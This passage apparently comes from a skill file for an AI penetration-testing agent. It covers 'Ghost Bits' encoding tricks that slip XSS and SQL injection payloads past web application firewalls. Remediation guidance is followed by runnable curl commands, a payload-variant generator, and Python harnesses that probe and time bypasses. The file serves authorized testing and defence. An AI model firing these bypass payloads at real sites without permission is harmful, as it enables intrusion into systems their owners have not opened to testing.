## 14. REMEDIATION REFERENCE

1. **Validate after the final normalization and cast, never before** — every Ghost Bits variant exists because a check ran on one representation and a sink consumed another. Move the check to the last point where the value is in its final form, and validate there.
2. **Reject by allowlist on the decoded value, not by denylist on the raw bytes** — a denylist of `../`, `%2f`, `<`, and quotes is defeated by any character that casts into them. Allowlist the permitted shape (filename charset, integer, enum) and reject everything else.
3. **Do not let a parser's cast decide security-relevant characters** — if a component folds exotic code points (`U+962E`, `U+962F`, `%2>`) into `.`, `/`, or `>`, that component must not be the last thing between input and a sink. Decode explicitly, then re-validate.
4. **Upgrade the affected components to the fixed versions** — BCEL >= 6.12.0, HttpClient >= 4.5.10 (or 5.x), GeoServer >= 2.28.3, Openfire >= 5.0.4, and the Spring/Jetty/HttpServer builds that addressed CVE-2025-41242 and the related advisories. Verify against the vendor advisory for your exact branch.
5. **Validate file paths on the canonical resolved path with a base-directory prefix check** — resolve first, compare second, and require the trailing separator on the base. This defeats `..%2>` exactly as it defeats `../`.
6. **Harden expression and template evaluation** — Ghost Bits re-enables EL/OGNL/SpEL injection where a filter rejected the ASCII form; disable dynamic evaluation on user input, or constrain it to a parsed AST allowlist rather than a string filter.
7. **Prefer safe APIs over string manipulation** — typed deserialization, parameterized queries, and structured path builders remove the sink that a cast can reach. Most Ghost Bits CVEs are only reachable because a string was concatenated into a security-sensitive API.
8. **Treat the HTTP layer and the application layer separately** — Jetty/Tomcat normalize before Spring or the app sees the value; test and fix both, and do not assume a hardened WAF covers an unhardened framework.
9. **Add encoded-variant regression tests to CI** — for every input that has a filter, add the Ghost Bits counterpart (`%2>`, overlong forms, the exotic code point table from §4) as a test case; a filter without a bypass test is an untested filter.
10. **Monitor for cast-shaped anomalies** — alert on high-bit/exotic code points in path, query, header, and body parameters, and on `U+FFFD` appearing where a control character was expected; these are the observable footprint of a Ghost Bits attempt.
11. **Re-audit after every dependency bump** — this class has repeatedly regressed because a transitive parser changed its folding behaviour; pin, watch advisories, and retest the §4 table on upgrade.

---

---

## 15. EXECUTION PRIMITIVES

Ghost-bits bypasses are proven by **a payload that one layer normalises and another does not, with a
blocked control, a benign control, and the payload's decoded form appearing in the response**. Every
block ends at a demonstrated downstream effect or a three-way classification.

### 15.1 Establish the control pair before any bypass

```bash
HOST="https://target.example"
# THE CONTROL: the plain payload, which the front end blocks
curl -sS -o /dev/null -w 'plain   %{http_code} len=%{size_download}\n' "$HOST/search?q=<script>alert(1)</script>"
curl -sS -o /dev/null -w 'sqli    %{http_code} len=%{size_download}\n' "$HOST/api/item?id=1%20OR%201=1"
# the benign baseline, which gives the size a PASSED variant must match
curl -sS -o /dev/null -w 'benign  %{http_code} len=%{size_download}\n' "$HOST/api/item?id=1"
# and the front end's identity, which tells you which normaliser you are fighting
curl -sS -D- -o /dev/null "$HOST/api/item?id=1+OR+1%3D1" 2>&1 | grep -iE 'cf-ray|akamai|x-sucuri|x-request-id|server' | head -5
```

**The blocked control, the benign control, and the front end's identity.** Without all three, a payload
that "worked" may simply be one the filter never inspected.

### 15.2 Generate the ghost-bits family programmatically

```python
def ghost_bits(keyword):
    b = keyword.encode()
    return {
        # the WAF may score before decoding; the app decodes - the first disagreement
        "urlencode":     "".join("%%%02X" % c for c in b),
        # a normaliser that subtracts 0xC0 and takes the low byte accepts this; a strict decoder rejects it
        "unicode_lt256": "".join("%C0%a%02X" % (c & 0x3F) for c in b),
        # overlong UTF-8: rejected by a conformant decoder, accepted by a permissive one
        "overlong_utf8": "".join("%%%02X%%%02X" % (0xC0 | (c >> 6), 0x80 | (c & 0x3F)) for c in b),
        # the HTML stage, when the sink is an HTML parser rather than a URL decoder
        "html_dec":      "".join("&#%d;" % c for c in b),
        "html_hex":      "".join("&#x%x;" % c for c in b),
        # the wide-byte form, where a trailing byte swallows the following ASCII character
        "wide_swallow":  "".join("%%%02X%02X%s" % (0x81 + (c % 0x20), 0x40, chr(c)) for c in b),
        # the NUL and control-character splits, which truncate one parser and not the other
        "nul_split":     "%00" + "".join("%%%02X" % c for c in b),
        "newline_split": "%0A" + "".join("%%%02X" % c for c in b),
    }

for k, v in ghost_bits("<script>").items():
    print("%-16s %s" % (k, v[:100]))
print()
print("RULE: three response classes - BLOCKED (equals the blocked control),")
print("PASSED (equals the benign control), PARTIAL (equals neither). Only PASSED is a bypass")
print("until a PARTIAL payload is shown to have a backend effect.")
```

**The generator is the technique.** Hand-picking variants from a list is what produces the cargo-cult
reports; the disagreement class is what determines the variant, and the class is derived from where the
two parsers differ.

### 15.3 Score every variant against both controls

```python
import requests
HOST, ENDPOINT, PARAM = "https://target.example", "/search", "q"

def probe(v):
    try:
        r = requests.get(f"{HOST}{ENDPOINT}", params={PARAM: v}, timeout=10)
        return r.status_code, len(r.content), ("%C0%BC" in r.text or "%253C" in r.text), ("<script>" in r.text)
    except Exception:
        return None, None, False, False

b, g = probe("<script>"), probe("hello")
print("blocked control:", b[0], b[1]); print("benign control :", g[0], g[1]); print()
VARIANTS = ["%3Cscript%3E", "%253Cscript%253E", "%C0%BCscript%C0%BE", "%00%3Cscript%3E",
            "%0A%3Cscript%3E", "%09%3Cscript%3E", "&#60;script&#62;", "%81%40script%81%41"]
print("%-22s %-5s %-8s %-9s %-9s %s" % ("variant", "code", "len", "encoded?", "decoded?", "class"))
for v in VARIANTS:
    c, l, enc, dec = probe(v)
    cls = "BLOCKED" if (c, l) == (b[0], b[1]) else ("PASSED" if (c, l) == (g[0], g[1]) else "PARTIAL")
    print("%-22s %-5s %-8s %-9s %-9s %s" % (v, c, l, enc, dec, cls))
print()
print("Report only a PASSED variant whose DECODED form appears in the response,")
print("or a PARTIAL variant with a demonstrated backend effect and an unencoded control.")
```

**Three response classes, two controls.** `PASSED` with the decoded form present is the bypass; a
`PARTIAL` result without a backend effect is a front-end misparse, not a finding.

### 15.4 Confirm the impact, not the reflection

```python
import requests, time, statistics
HOST = "https://target.example"
MARK = "ghost" + "bits" + "marker"

# 1) for a filter bypass into an HTML sink: the DECODED form must appear, with your marker
r = requests.get(f"{HOST}/search", params={"q": "%C0%BCscript%C0%BE" + MARK}, timeout=10)
print("encoded remains :", "%C0%BC" in r.text)
print("decoded present :", "<script>" in r.text, "|", MARK in r.text)
print()

# 2) for a bypass into a query: the backend effect, measured as a three-run median
def timed(q, n=3):
    ts = []
    for _ in range(n):
        t0 = time.perf_counter(); requests.get(f"{HOST}/api/item", params={"id": q}, timeout=20)
        ts.append(time.perf_counter() - t0)
    return statistics.median(ts)

bn, bl, va = timed("1"), timed("1 OR 1=1"), timed("1%00 OR 1=1")
print(f"benign {bn*1000:8.1f} ms | blocked {bl*1000:8.1f} ms | variant {va*1000:8.1f} ms")
print("the variant must track the BENIGN time and differ measurably from the BLOCKED one")
print("a single slow response is jitter - the three-run median is the evidence")
print()

# 3) and the error-based signal, which is more reliable than timing
r3 = requests.get(f"{HOST}/api/item", params={"id": "1%00%27"}, timeout=10)
r4 = requests.get(f"{HOST}/api/item", params={"id": "1%27"}, timeout=10)
import re as _re
pat = _re.compile(r"sql|syntax|odbc|driver|SQLSTATE", _re.I)
print("variant leaks backend error:", bool(pat.search(r3.text)))
print("control (unencoded quote) leaks:", bool(pat.search(r4.text)), "<- must be False")
```

**The decoded form in the response, or the backend effect with its control.** A payload that round-trips
still encoded has proven nothing, because the filter and the application saw the same bytes.

### 15.5 Locate the disagreeing layer

```bash
# each split is a hypothesis about WHERE the two parsers differ - report the layer, not just the payload
# 1) the content-type split: proxies frequently inspect only one body shape
curl -sS -o /dev/null -w 'json  %{http_code}\n' -H 'Content-Type: application/json' --data '{"q":"<script>"}' "$HOST/api/search"
curl -sS -o /dev/null -w 'form  %{http_code}\n' -H 'Content-Type: application/x-www-form-urlencoded' --data 'q=%3Cscript%3E' "$HOST/api/search"
# 2) the charset split: the same bytes declared as a wide encoding
curl -sS -o /dev/null -w 'utf8  %{http_code}\n' -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' --data 'q=%C0%BCscript%C0%BE' "$HOST/api/search"
curl -sS -o /dev/null -w 'gbk   %{http_code}\n' -H 'Content-Type: application/x-www-form-urlencoded; charset=gbk'    --data 'q=%81%40' "$HOST/api/search"
# 3) the location split: header vs body, path vs query
curl -sS -o /dev/null -w 'hdr   %{http_code}\n' -H "X-Query: <script>" "$HOST/api/search"
curl -sS -o /dev/null -w 'path  %{http_code}\n' "$HOST/api/<script>/search"
# 4) the encoding split at the transport: a proxy that normalises after decompression
curl -sS -o /dev/null -w 'gzip  %{http_code}\n' -H 'Content-Encoding: gzip' --data-binary @payload.gz "$HOST/api/search"
```

**Name the layer that disagreed.** It is the difference between a proxy rule to update and a framework
decoder to configure, and a report that names only the payload cannot be actioned.

### 15.6 The harness that reproduces the whole table

```bash
python3 - <<'PY'
import requests
HOST, ENDPOINT, PARAM = "https://target.example", "/search", "q"
VARIANTS = {"urlencode": "%3Cscript%3E", "double": "%253Cscript%253E", "unicode_lt256": "%C0%BCscript%C0%BE",
            "overlong": "%C1%BCscript%C1%BE", "nul": "%00%3Cscript%3E", "newline": "%0A%3Cscript%3E",
            "wide_gbk": "%81%40script%81%41", "html_dec": "&#60;script&#62;"}

def probe(v):
    try:
        r = requests.get(f"{HOST}{ENDPOINT}", params={PARAM: v}, timeout=10)
        return r.status_code, len(r.content), ("<script>" in r.text)
    except Exception:
        return None, None, False

b, g = probe("<script>"), probe("hello")
print("blocked:", b[:2], " benign:", g[:2]); print()
print("%-14s %-6s %-8s %-6s %s" % ("variant", "code", "len", "dec?", "class"))
for k, v in VARIANTS.items():
    c, l, dec = probe(v)
    cls = "BLOCKED" if (c, l) == (b[0], b[1]) else ("PASSED" if (c, l) == (g[0], g[1]) else "PARTIAL")
    print("%-14s %-6s %-8s %-6s %s" % (k, c, l, dec, cls))
print()
print("Include this table verbatim in the report. A bypass without it is not reproducible,")
print("and a variable bypass is a jitter artefact unless the three-run median says otherwise.")
PY
```

**The table is the deliverable.** It is what lets the client reproduce the bypass, and it is what
separates a systematic test from a lucky string.

---

## 16. RELATED SIBLINGS - LOAD TOGETHER
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — the traversal sink Ghost Bits most often re-enables
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) · [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — filters that a cast can be used to defeat
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — BCEL/Fastjson chains reached through the same parser behaviour
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — request-layer normalization differences that interact with cast timing
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting a bypass with the blocked control attached
